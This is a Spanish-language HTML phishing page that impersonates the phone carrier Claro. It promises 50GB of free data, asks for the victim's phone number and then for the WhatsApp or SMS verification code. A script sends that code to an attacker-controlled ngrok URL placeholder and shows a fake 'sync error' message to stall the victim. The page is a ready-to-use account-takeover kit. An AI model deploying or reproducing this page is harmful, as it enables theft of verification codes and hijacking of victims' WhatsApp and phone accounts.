<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claro | Gestión de Beneficios</title>
    <style>
        body { font-family: sans-serif; background-color: #f2f2f2; margin: 0; text-align: center; }
        .navbar { background: #ee1c25; padding: 15px; color: white; font-weight: bold; font-size: 20px; }
        .container { width: 90%; max-width: 450px; margin: 30px auto; background: white; border-radius: 15px; padding: 25px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
        h2 { color: #ee1c25; }
        input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 20px; text-align: center; box-sizing: border-box; }
        .btn { background: #ee1c25; color: white; padding: 15px; width: 100%; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
        #step2 { display: none; }
    </style>
</head>
<body>

<div class="navbar">Claro Club</div>

<div class="container">
    <div id="step1">
        <h2>¡Pack Activo!</h2>
        <p>Ingresá tu número para recibir tus <b>50GB Gratis</b>:</p>
        <input type="tel" id="phone" placeholder="Código de área + número">
        <button class="btn" onclick="document.getElementById('step1').style.display='none';document.getElementById('step2').style.display='block';">VINCULAR LÍNEA</button>
    </div>

    <div id="step2">
        <h2>VALIDACIÓN</h2>
        <p>Ingresá el código que recibiste por <b>WhatsApp o SMS</b> para confirmar la línea.</p>
        <input type="number" id="code" placeholder="000000">
        <button class="btn" onclick="enviarAlTerminal()">ACTIVAR AHORA</button>
    </div>
</div>

<script>
    function enviarAlTerminal() {
        const codigo = document.getElementById('code').value;
        // CONEXIÓN AL PUERTO 8080
        fetch('https://TU-URL-DE-NGROK.ngrok-free.app/log?codigo=' + codigo)
        .then(() => { alert("Error de sincronización. Reintente en 5 minutos."); })
        .catch(() => { alert("Error de sincronización. Reintente en 5 minutos."); });
    }
</script>

</body>
</html>
